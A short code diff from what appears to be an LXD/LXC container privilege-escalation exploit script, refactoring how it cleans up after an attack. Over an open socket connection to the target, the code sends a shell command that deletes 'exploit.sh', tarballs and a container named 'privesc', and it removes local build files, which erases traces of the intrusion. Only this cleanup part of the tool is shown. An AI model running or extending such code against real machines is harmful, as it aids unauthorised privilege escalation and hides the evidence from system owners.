@@ -69,7 +69,7 @@ def listen(ip,port, t2, r_port, file_name):
 		if conn:
 			print('\n[-] Unbinding...')
 			# Cleanup
-			conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force'.encode())
+			cleanup(conn, file_name)
 			time.sleep(0.2)
 			conn.close()
 			s.close()
@@ -157,3 +157,10 @@ def recvall(sock):
             break
     return data
 
+
+def cleanup(conn, file_name):
+	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force'.encode())
+	if os.path.exists(file_name):
+		os.remove(file_name)
+	if os.path.exists('build-alpine'):
+		os.remove('build-alpine')
